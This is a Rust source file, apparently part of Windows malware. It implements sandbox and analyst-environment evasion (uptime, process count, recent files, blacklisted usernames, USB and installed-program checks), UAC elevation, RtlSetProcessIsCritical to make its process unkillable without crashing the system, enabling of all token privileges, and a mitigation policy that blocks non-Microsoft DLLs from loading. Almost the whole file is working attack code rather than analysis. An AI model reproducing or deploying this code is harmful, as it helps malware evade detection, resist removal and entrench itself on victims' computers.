use std::collections::HashMap;
use std::fs;
use std::mem;
use std::net::TcpStream;
use std::process::Command;
use std::time::Duration;
use windows::{
    core::*,
    Win32::{
        Foundation::*,
        System::{
            ProcessStatus::*,
            SystemInformation::*,
            Threading::*,
        },
        Security::*,
    },
};

// ============================================================================
// ANTI-SANDBOX MODULE
// Contains all sandbox and automated analysis environment detection
// ============================================================================

/// Run only environment analysis checks.
pub fn run_environment_checks() -> bool {
    !clean_environment_detection::detect_clean_environment() ||
    pc_uptime::check_uptime(600).unwrap_or(false) ||
    running_processes::check_running_processes_count(50).unwrap_or(false) ||
    recent_file_activity::recent_file_activity_check().unwrap_or(false) ||
    repetitive_process::check().unwrap_or(false) ||
    username_check::check_for_blacklisted_names() ||
    usb_check::plugged_in().unwrap_or(true) == false ||
    internet_check::check_connection().unwrap_or(true) == false
}

pub mod internet_check {
    use std::net::TcpStream;
    use std::time::Duration;

    pub fn check_connection() -> Result<bool, String> {
        match TcpStream::connect_timeout(
            &"8.8.8.8:53".parse().unwrap(),
            Duration::from_secs(5)
        ) {
            Ok(_) => Ok(true),
            Err(e) => Err(format!("Error checking internet connection: {}", e)),
        }
    }
}

pub mod pc_uptime {
    use super::*;
    pub fn get_uptime_in_seconds() -> std::result::Result<u32, String> {
        unsafe {
            let uptime_ms = GetTickCount();
            Ok(uptime_ms / 1000)
        }
    }

    pub fn check_uptime(duration_in_seconds: u32) -> std::result::Result<bool, String> {
        let uptime = get_uptime_in_seconds()?;
        Ok(uptime < duration_in_seconds)
    }
}

pub mod running_processes {
    use super::*;

    pub fn get_running_processes_count() -> std::result::Result<usize, String> {
        unsafe {
            let mut processes = [0u32; 1024];
            let mut bytes_returned = 0u32;

            if K32EnumProcesses(
                processes.as_mut_ptr(),
                (processes.len() * mem::size_of::<u32>()) as u32,
                &mut bytes_returned,
            ).as_bool() {
                Ok(bytes_returned as usize / mem::size_of::<u32>())
            } else {
                Err(format!("Failed to enumerate processes: {:?}", GetLastError()))
            }
        }
    }

    pub fn check_running_processes_count(threshold: usize) -> std::result::Result<bool, String> {
        let count = get_running_processes_count()?;
        Ok(count < threshold)
    }
}

pub mod clean_environment_detection {
    fn count_installed_programs() -> usize {
        let mut count = 0;
        let uninstall_keys = [ "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall" ];
        for key_path in &uninstall_keys {
            if let Ok(output) = std::process::Command::new("reg").args(&["query", &format!("HKLM\\{}", key_path)]).output() {
                if output.status.success() {
                    count += String::from_utf8_lossy(&output.stdout).matches("HKEY_LOCAL_MACHINE").count();
                }
            }
        }
        count
    }
    pub fn detect_clean_environment() -> bool {
        count_installed_programs() >= 10
    }
}

pub mod cyber_capture {
    use std::fs;
    use super::utils::get_env_var;
    pub fn create_directory() -> bool {
        if let Some(program_files) = get_env_var("ProgramFiles") {
            let dir = format!("{}\\antvirusdefender2025", program_files);
            return fs::create_dir_all(&dir).is_ok();
        }
        false
    }
}

pub mod recent_file_activity {
    use std::fs;
    use super::utils::*;
    pub fn recent_file_activity_check() -> Result<bool, String> {
        let appdata = get_env_var("APPDATA").ok_or("APPDATA environment variable not found")?;
        let rec_dir = format!("{}\\Microsoft\\Windows\\Recent", appdata);
        match fs::read_dir(&rec_dir) {
            Ok(entries) => Ok(entries.count() < 20),
            Err(e) => Err(format!("Failed to read recent directory: {}", e)),
        }
    }
}

pub mod repetitive_process {
    use std::collections::HashMap;
    use std::process::Command;
    pub fn check() -> Result<bool, String> {
        let output = Command::new("tasklist").output().map_err(|e| format!("Failed to execute tasklist: {}", e))?;
        let mut process_counts: HashMap<String, usize> = HashMap::new();
        for line in String::from_utf8_lossy(&output.stdout).lines() {
            if let Some(process_name) = line.split_whitespace().next() {
                if process_name != "svchost.exe" {
                    *process_counts.entry(process_name.to_string()).or_insert(0) += 1;
                }
            }
        }
        Ok(process_counts.values().any(|&count| count > 60))
    }
}

pub mod admin_check {
    use std::ffi::OsStr;
    use std::mem;
    use std::os::windows::ffi::OsStrExt;

    use windows::core::{PCSTR, PCWSTR};
    use crate::BOOL;    
    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
    use windows::Win32::UI::Shell::ShellExecuteW;
    use windows::Win32::UI::WindowsAndMessaging::SW_SHOWNORMAL;

    /// Returns true if the current process is running with administrative privileges.
    /// Uses IsUserAnAdmin exported from shell32.dll via GetProcAddress to avoid build-time
    /// signature issues with different windows crate versions.
    pub fn is_admin() -> bool {
        unsafe {
            // Get handle to shell32.dll
            if let Ok(shell32) = GetModuleHandleA(PCSTR(b"shell32.dll\0".as_ptr())) {
                if let Some(proc_addr) = GetProcAddress(shell32, PCSTR(b"IsUserAnAdmin\0".as_ptr())) {
                    // Signature: BOOL IsUserAnAdmin(void);
                    let is_admin_fn: unsafe extern "system" fn() -> BOOL = mem::transmute(proc_addr);
                    return is_admin_fn().as_bool();
                }
            }
            false
        }
    }

    /// Relaunch current executable elevated (UAC) using ShellExecuteW with verb "runas".
    /// Returns Ok(()) if ShellExecute indicates success (>32 per WinAPI convention).
    pub fn elevate_process() -> Result<(), String> {
        // Helper to transform to null-terminated wide string Vec<u16>
        fn to_wide_null(s: &OsStr) -> Vec<u16> {
            s.encode_wide().chain(std::iter::once(0)).collect()
        }

        let current_exe = std::env::current_exe().map_err(|e| format!("Failed to get current exe path: {}", e))?;
        let args: String = std::env::args().skip(1).collect::<Vec<_>>().join(" ");

        let verb = to_wide_null(OsStr::new("runas"));
        let exe_path = to_wide_null(current_exe.as_os_str());
        let args_wide = to_wide_null(OsStr::new(&args));

        // Call ShellExecuteW
        let result = unsafe {
            ShellExecuteW(
                None,
                PCWSTR(verb.as_ptr()),
                PCWSTR(exe_path.as_ptr()),
                // pass null if no args (args_wide will be a single null u16 if empty)
                if args_wide.len() > 1 { PCWSTR(args_wide.as_ptr()) } else { PCWSTR(std::ptr::null()) },
                PCWSTR(std::ptr::null()),
                SW_SHOWNORMAL,
            )
        };

        // ShellExecuteW returns an HINSTANCE-like value; values > 32 indicate success.
        if (result.0 as isize) > 32 {
            Ok(())
        } else {
            Err(format!("ShellExecuteW failed or elevation cancelled (raw return = {:?})", result.0))
        }
    }
}

pub mod runtime_detector {
    #[derive(Debug, Clone, PartialEq, Eq)]
    pub enum OperatingSystem { Unknown, Windows, Linux, MacOS }

    pub fn detect_os() -> OperatingSystem {
        match std::env::consts::OS {
            "windows" => OperatingSystem::Windows,
            "linux" => OperatingSystem::Linux,
            "macos" => OperatingSystem::MacOS,
            _ => OperatingSystem::Unknown,
        }
    }

    pub fn is_windows() -> bool {
        matches!(detect_os(), OperatingSystem::Windows)
    }
}

pub mod critical_process {
    use std::mem;
    use windows::core::PCSTR;
    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};

    /// Set the current process as critical using RtlSetProcessIsCritical.
    /// Returns Ok(()) on NT success (STATUS_SUCCESS == 0), Err(...) otherwise.
    ///
    /// WARNING: making a process critical means terminating that process (or letting it crash)
    /// may cause a system crash (BSOD). Use only when you fully understand the consequences.
    pub fn set_process_critical() -> Result<(), String> {
        unsafe {
            // Get ntdll module handle
            let ntdll = GetModuleHandleA(PCSTR(b"ntdll.dll\0".as_ptr()))
                .map_err(|e| format!("GetModuleHandleA(ntdll.dll) failed: {}", e))?;

            // Get address of RtlSetProcessIsCritical
            let proc_addr = GetProcAddress(ntdll, PCSTR(b"RtlSetProcessIsCritical\0".as_ptr()))
                .ok_or_else(|| "RtlSetProcessIsCritical not found in ntdll".to_string())?;

            // Signature (native):
            // NTSTATUS RtlSetProcessIsCritical(BOOLEAN NewValue, PBOOLEAN OldValue, BOOLEAN IsCritical);
            // BOOLEAN is 8-bit; NTSTATUS is i32.
            type RtlSetProcessIsCriticalFn = unsafe extern "system" fn(u8, *mut u8, u8) -> i32;

            let set_critical: RtlSetProcessIsCriticalFn = mem::transmute(proc_addr);

            // NewValue = TRUE (1), OldValue = NULL, IsCritical = FALSE (0)
            let status = set_critical(1u8, std::ptr::null_mut(), 0u8);

            // STATUS_SUCCESS == 0
            if status == 0 {
                Ok(())
            } else {
                Err(format!("RtlSetProcessIsCritical failed (NTSTATUS = 0x{:X})", status as u32))
            }
        }
    }
}

pub mod all_tokens {
    use super::*;
    
    const TOKENS: &[&str] = &[ "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeBackupPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeCreatePagefilePrivilege", "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege", "SeCreateTokenPrivilege", "SeDebugPrivilege", "SeDelegateSessionUserImpersonatePrivilege", "SeEnableDelegationPrivilege", "SeImpersonatePrivilege", "SeIncreaseQuotaPrivilege", "SeIncreaseBasePriorityPrivilege", "SeIncreaseWorkingSetPrivilege", "SeLoadDriverPrivilege", "SeLockMemoryPrivilege", "SeMachineAccountPrivilege", "SeManageVolumePrivilege", "SeProfileSingleProcessPrivilege", "SeRelabelPrivilege", "SeRemoteShutdownPrivilege", "SeRestorePrivilege", "SeSecurityPrivilege", "SeShutdownPrivilege", "SeSyncAgentPrivilege", "SeSystemtimePrivilege", "SeSystemEnvironmentPrivilege", "SeSystemProfilePrivilege", "SeTakeOwnershipPrivilege", "SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege", "SeUndockPrivilege" ];

    pub fn enable() -> std::result::Result<(), Box<dyn std::error::Error>> {
        unsafe {
            let mut h_token = HANDLE::default();
            OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut h_token)?;

            for token_name in TOKENS {
                let privilege_name: Vec<u16> = token_name.encode_utf16().chain(std::iter::once(0)).collect();
                let mut luid = LUID::default();
                if LookupPrivilegeValueW(PCWSTR::null(), PCWSTR(privilege_name.as_ptr()), &mut luid).is_ok() {
                    let tp = TOKEN_PRIVILEGES {
                        PrivilegeCount: 1,
                        Privileges: [LUID_AND_ATTRIBUTES { Luid: luid, Attributes: SE_PRIVILEGE_ENABLED }],
                    };
                    let _ = AdjustTokenPrivileges(h_token, false, Some(&tp), 0, None, None);
                }
            }
            CloseHandle(h_token)?;
        }
        Ok(())
    }
}

pub mod usb_check {
    use super::utils::*;
    pub fn plugged_in() -> Result<bool, String> {
        if registry_key_exists("HKLM", "SYSTEM\\ControlSet001\\Services\\USBSTOR") { return Ok(true); }
        if let Ok(output) = get_command_output("reg", &["query", "HKLM\\SYSTEM\\ControlSet001\\Enum\\USBSTOR"]) {
            if output.matches("HKEY_LOCAL_MACHINE").count() > 0 { return Ok(true); }
        }
        Ok(false)
    }
}

pub mod username_check {
    use super::utils::*;
    pub fn check_for_blacklisted_names() -> bool {
        let blacklisted_names = [ "johnson", "miller", "malware", "maltest", "currentuser", "sandbox", "virus", "john doe", "test user", "sand box", "wdagutilityaccount", "bruno", "george", "harry johnson" ];
        if let Some(username) = get_env_var("USERNAME") {
            let username_lower = username.to_lowercase();
            return blacklisted_names.iter().any(|&name| username_lower == name);
        }
        false
    }
}

pub mod mitigation_policy_patch {
    use super::*;
    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};

    pub fn configure_process_mitigation_policy() -> std::result::Result<(), String> {
        const PROCESS_SIGNATURE_POLICY_MITIGATION: u32 = 8;
        #[repr(C)]
        struct ProcessMitigationBinarySignaturePolicy { microsoft_signed_only: u32 }

        unsafe {
            let kernel32 = GetModuleHandleA(s!("kernel32.dll")).map_err(|e| e.to_string())?;
            let set_process_mitigation_policy = GetProcAddress(kernel32, s!("SetProcessMitigationPolicy")).ok_or("SetProcessMitigationPolicy not found".to_string())?;
            type SetProcessMitigationPolicyFn = unsafe extern "system" fn(u32, *const std::ffi::c_void, u32) -> BOOL;
            let set_policy: SetProcessMitigationPolicyFn = mem::transmute(set_process_mitigation_policy);
            let policy = ProcessMitigationBinarySignaturePolicy { microsoft_signed_only: 1 };
            if set_policy(PROCESS_SIGNATURE_POLICY_MITIGATION, &policy as *const _ as *const std::ffi::c_void, mem::size_of_val(&policy) as u32).as_bool() {
                Ok(())
            } else {
                Err("Failed to set mitigation policy".to_string())
            }
        }
    }
}

pub mod utils {
    use std::process::Command;

    /// Execute a command and return whether it succeeded
    pub fn execute_command(cmd: &str, args: &[&str]) -> bool {
        Command::new(cmd)
            .args(args)
            .output()
            .map(|output| output.status.success())
            .unwrap_or(false)
    }

    /// Execute a command and return its output as a string
    pub fn get_command_output(cmd: &str, args: &[&str]) -> Result<String, String> {
        let output = Command::new(cmd)
            .args(args)
            .output()
            .map_err(|e| format!("Failed to execute command: {}", e))?;

        if output.status.success() {
            Ok(String::from_utf8_lossy(&output.stdout).trim().to_string())
        } else {
            Err(String::from_utf8_lossy(&output.stderr).to_string())
        }
    }

    /// Check if a file or directory exists
    pub fn path_exists(path: &str) -> bool {
        std::fs::metadata(path).is_ok()
    }

    /// Check if a registry key exists using reg command
    pub fn registry_key_exists(hive: &str, key_path: &str) -> bool {
        execute_command("reg", &["query", &format!("{}\\{}", hive, key_path)])
    }

    /// Check if a registry value exists using reg command
    pub fn registry_value_exists(hive: &str, key_path: &str, value_name: &str) -> bool {
        execute_command("reg", &["query", &format!("{}\\{}", hive, key_path), "/v", value_name])
    }

    /// Check if a service exists and is running
    pub fn service_is_running(service_name: &str) -> bool {
        if let Ok(output) = get_command_output("sc", &["query", service_name]) {
            output.contains("RUNNING")
        } else {
            false
        }
    }

    /// Check if a service exists (regardless of state)
    pub fn service_exists(service_name: &str) -> bool {
        execute_command("sc", &["query", service_name])
    }

    /// Get environment variable safely
    pub fn get_env_var(var_name: &str) -> Option<String> {
        std::env::var(var_name).ok()
    }

    /// Check if a process is running by name
    pub fn process_is_running(process_name: &str) -> bool {
        if let Ok(output) = get_command_output("tasklist", &["/fi", &format!("imagename eq {}", process_name)]) {
            output.to_lowercase().contains(&process_name.to_lowercase())
        } else {
            false
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_runtime_detection() {
        println!("Detected OS: {:?}", runtime_detector::detect_os());
        assert_eq!(runtime_detector::is_windows(), cfg!(windows));
    }

    #[test] 
    fn test_admin_check() {
        println!("Running as admin: {}", admin_check::is_admin());
    }

    #[test]
    fn test_uptime_check() {
        if let Ok(uptime) = pc_uptime::get_uptime_in_seconds() {
            println!("System uptime: {} seconds", uptime);
        }
    }

    #[test]
    fn test_process_count() {
        if let Ok(count) = running_processes::get_running_processes_count() {
            println!("Running processes: {}", count);
        }
    }

    #[test]
    fn test_environment_checks() {
        println!("Suspicious environment detected: {}", run_environment_checks());
    }

    #[test]
    fn test_internet_connection() {
        if let Ok(connected) = internet_check::check_connection() {
            println!("Internet connection available: {}", connected);
        }
    }

    #[test]
    fn test_username_check() {
        println!("Blacklisted username: {}", username_check::check_for_blacklisted_names());
    }

    #[test]
    fn test_usb_devices() {
        if let Ok(usb_detected) = usb_check::plugged_in() {
            println!("USB devices detected: {}", usb_detected);
        }
    }

    #[test]
    fn test_installed_programs() {
        println!("Clean environment (10+ programs): {}", clean_environment_detection::detect_clean_environment());
    }

    #[test]
    fn test_privilege_escalation() {
        if admin_check::is_admin() {
            match all_tokens::enable() {
                Ok(_) => println!("Successfully enabled all available privileges"),
                Err(e) => println!("Failed to enable privileges: {}", e),
            }
        } else {
            println!("Not running as admin, cannot test privilege escalation");
        }
    }
}
